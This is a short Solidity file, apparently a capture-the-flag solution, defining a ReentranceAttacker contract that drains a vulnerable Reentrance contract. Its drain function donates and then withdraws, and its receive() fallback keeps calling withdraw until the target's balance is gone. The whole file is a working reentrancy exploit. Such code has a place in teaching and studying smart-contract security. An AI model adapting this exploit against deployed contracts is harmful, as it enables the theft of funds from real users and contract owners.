// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
import {Reentrance} from "../Reentrance.sol";

contract ReentranceAttacker {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function drain(Reentrance reentrance) public payable onlyOwner {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (address(msg.sender).balance > 0) {
            Reentrance(payable(msg.sender)).withdraw(
                msg.value <= address(msg.sender).balance ? msg.value : address(msg.sender).balance
            );
        }
    }
}
